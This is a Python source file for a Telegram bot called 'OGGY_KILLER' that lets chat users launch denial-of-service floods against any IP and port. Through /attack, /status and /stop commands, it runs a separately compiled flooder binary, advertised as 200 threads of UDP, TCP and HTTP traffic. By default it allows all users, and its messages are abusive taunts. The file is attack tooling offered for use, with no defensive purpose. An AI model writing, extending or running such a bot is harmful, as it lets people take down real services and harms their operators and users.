#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import threading
import time
import signal
import json
from datetime import datetime

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
except ImportError:
    print("[!] Install python-telegram-bot first: pip install python-telegram-bot==20.0")
    sys.exit(1)

# ============ CONFIG ============
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # @BotFather se lo
ALLOWED_USERS = []  # Empty = sabko allow, ya ["user_id1", "user_id2"]
OGGY_ATTACK_FILE = "./oggy"
# ================================

attack_thread = None
attack_running = False
current_attack_info = {}

def run_attack(ip, port, time):
    global attack_running
    attack_running = True
    
    cmd = [OGGY_ATTACK_FILE, ip, str(port), str(time)]
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Real-time output read
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(f"[ATTACK] {output.strip()}")
        
        # Wait for process to finish
        process.wait()
        attack_running = False
        return True
        
    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")
        attack_running = False
        return False

# Check if OGGY binary exists
def check_oggy():
    if not os.path.exists(OGGY_ATTACK_FILE):
        return False
    return os.access(OGGY_ATTACK_FILE, os.X_OK)

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text(
            "❌ CHUMT KA GULAM, tu allowed nahi hai! 😾\n"
            "Owner OGGY se contact kar."
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🎯 Attack Now", callback_data='attack')],
        [InlineKeyboardButton("📊 Status", callback_data='status')],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data='stop')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"😈🔥 **OGGY_KILLER TELEGRAM BOT ACTIVE** 🔥😈\n\n"
        f"CHUMT KE PYASA, welcome!\n"
        f"Attack tool ready hai.\n\n"
        f"Commands:\n"
        f"/attack <IP> <PORT> <TIME> - Start attack\n"
        f"/status - Check current status\n"
        f"/stop - Stop ongoing attack\n"
        f"/help - Show help\n\n"
        f"Developer: @OGGY\n"
        f"❤️ CHUMT KA DARINDA",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Attack command
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_thread, attack_running
    
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Tu allowed nahi hai, CHUMT KA GULAM!")
        return
    
    if not check_oggy():
        await update.message.reply_text(
            "❌ OGGY binary nahi mila!\n"
            "Pehle 'oggy_destroyer.c' compile kar:\n"
            "`gcc -pthread -o oggy oggy_destroyer.c`",
            parse_mode='Markdown'
        )
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ **Usage:** `/attack <IP> <PORT> <TIME>`\n"
            "Example: `/attack 192.168.1.1 80 60`",
            parse_mode='Markdown'
        )
        return
    
    ip = args[0]
    port = int(args[1])
    time_sec = int(args[2])
    
    if attack_running:
        await update.message.reply_text(
            "⚠️ Attack already running! Use /stop to stop it first."
        )
        return
    
    current_attack_info['ip'] = ip
    current_attack_info['port'] = port
    current_attack_info['time'] = time_sec
    current_attack_info['started'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    await update.message.reply_text(
        f"🔥 **ATTACK LAUNCHED!** 🔥\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Duration: `{time_sec} sec`\n"
        f"💀 Threads: `200` (UDP + TCP + HTTP)\n"
        f"👿 OGGY says: CHUMT KA DARINDA ne shuru kar diya!\n\n"
        f"Use /status to check progress.",
        parse_mode='Markdown'
    )
    
    # Run attack in separate thread
    attack_thread = threading.Thread(target=run_attack, args=(ip, port, time_sec))
    attack_thread.daemon = True
    attack_thread.start()

# Status command
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running, current_attack_info
    
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    if attack_running:
        info = current_attack_info
        await update.message.reply_text(
            f"📊 **ATTACK STATUS: RUNNING** 💀\n\n"
            f"🎯 Target: `{info.get('ip', 'N/A')}:{info.get('port', 'N/A')}`\n"
            f"⏱️ Duration: `{info.get('time', 'N/A')} sec`\n"
            f"🕒 Started: `{info.get('started', 'N/A')}`\n"
            f"🧵 Threads: `200`\n"
            f"👿 OGGY says: System ki maa chod rahe hain! 😈🔥",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "📊 **Status: IDLE**\n\n"
            "Koi attack nahi chal raha.\n"
            "/attack use karo to start, CHUMT KE PYASA! 😈",
            parse_mode='Markdown'
        )

# Stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    if attack_running:
        # Send SIGINT to stop attack
        os.kill(os.getpid(), signal.SIGINT)
        attack_running = False
        
        await update.message.reply_text(
            "🛑 **ATTACK STOPPED!** 🛑\n\n"
            "CHUMT KA GULAM bach gaya! 😂\n"
            "OGGY says: Agli baar phir milenge! 😈",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "⚠️ Koi attack nahi chal raha.\n"
            "Chal shuru kar, /attack use kar!",
            parse_mode='Markdown'
        )

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🤖 **OGGY_KILLER BOT HELP**\n\n"
        f"**Commands:**\n"
        f"`/start` - Show main menu\n"
        f"`/attack <IP> <PORT> <TIME>` - Launch attack\n"
        f"`/status` - Check attack status\n"
        f"`/stop` - Stop current attack\n"
        f"`/help` - Show this help\n\n"
        f"**Example:**\n"
        f"`/attack 1.2.3.4 80 30`\n\n"
        f"**Developer:** @OGGY\n"
        f"**CHUMT KA DARINDA 😈🔥**",
        parse_mode='Markdown'
    )

# Button handler
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'attack':
        await query.edit_message_text(
            "🎯 Use `/attack <IP> <PORT> <TIME>`\n"
            "Example: `/attack 192.168.1.1 80 60`",
            parse_mode='Markdown'
        )
    elif query.data == 'status':
        await status(update, context)
    elif query.data == 'stop':
        await stop(update, context)
    elif query.data == 'help':
        await help_command(update, context)

def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[!] Pehle BOT_TOKEN set kar! @BotFather se token lo.")
        print("[!] Python file mein BOT_TOKEN variable change kar.")
        sys.exit(1)
    
    if not check_oggy():
        print("[!] OGGY binary nahi mila!")
        print("[!] Compile kar: gcc -pthread -o oggy oggy_destroyer.c")
        sys.exit(1)
    
    print("🔥 OGGY_KILLER TELEGRAM BOT STARTING...")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print("💀 CHUMT KA DARINDA ready hai!\n")
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Start bot
    print("🤖 Bot running... Press Ctrl+C to stop")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()